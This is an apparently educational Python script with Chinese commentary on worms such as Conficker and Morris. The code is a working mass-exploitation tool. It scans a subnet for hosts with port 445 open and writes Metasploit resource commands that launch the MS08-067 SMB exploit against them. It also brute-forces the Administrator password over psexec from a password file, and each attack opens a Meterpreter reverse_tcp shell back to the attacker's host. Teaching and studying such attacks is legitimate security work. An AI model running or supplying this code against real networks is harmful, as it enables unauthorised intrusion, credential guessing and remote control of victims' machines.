"""
蠕虫病毒: Conficker, W32DownandUp, Morris

莫里斯蠕虫包含了常用的用户名和密码
SSH 蠕虫

Metasploit是一款免费的、开源的渗透测试平台，可以用于渗透测试不同的系统和框架，也可以看作是一个单独的渗透测试系统。
Metasploit 提供了先进的动态的攻击荷载 Meterpreter, Meterpreter 运行在远程主机上,返回给我们命令行用来控制主机,提供了大量的控制和分析目标主机
的能力。Meterpreter 扩展了命令行的能力,包括数字取证,发送命令,远程路由,安装键盘记录器,下载密码或者 Hash 密码等等功能。

python-nmap 模块
"""

# 扫描 445 端口打开的主机,然后利用 Metasploit 资源文件攻击有漏洞的主机。

# 首先,让我们从先前的端口扫描的例子中利用 python-nmap 模块。

# 函数通过迭代扫描所有的主机,如果函数发现主机开放了 445 端口,就将主机加入列表中。完成迭代后,函数会返回包含所有开放 445 端口主机的列表。
import nmap


def findTgts(subNet):
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            if state == 'open':
                print('[+] Found Target Host: ' + host)
                tgtHosts.append(host)
    return tgtHosts

# 接下来,我们将对我们攻击的目标设置监听,监听器或者命令行与控制信道,一旦他们渗透成功我们就可以与远程目标主机进行交互。设置一个全局配置 DisablePayloadHandler 来标识以后我
# 们所有的主机都不必设置监听器

def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')
    configFile.write('setg DisablePayloadHandler 1\n')

# 最后,脚本已经准备好了攻击目标主机。这个函数将接收一个 Metasploit 配置文件,一个目标主机,一个本地地址和端口作为输入进行渗透测试。
# 它发送一个指令开始攻击目标主机,在后台执行工作(-j),但并不马上打开交互(-z),该脚本需要一些特定的选项,因为它将攻击多个主机,无法与所以的主机进行交互。

def confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')


# Conficker攻击向量:
#   Windows Server的0day 漏洞,蠕虫能够引起 堆栈溢出 从而能够执行 Shellcode 并下载一个副本给受到感染的主机。
#   Conficker 蠕虫尝试通过暴力破解默认的网络管理共享 (ADMIN$)来获取受害人主机的管理权限:
#       超过 250 个常用密码的密码列表
#       Morris 蠕虫曾使用的密码列表有 432 个密码

def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')

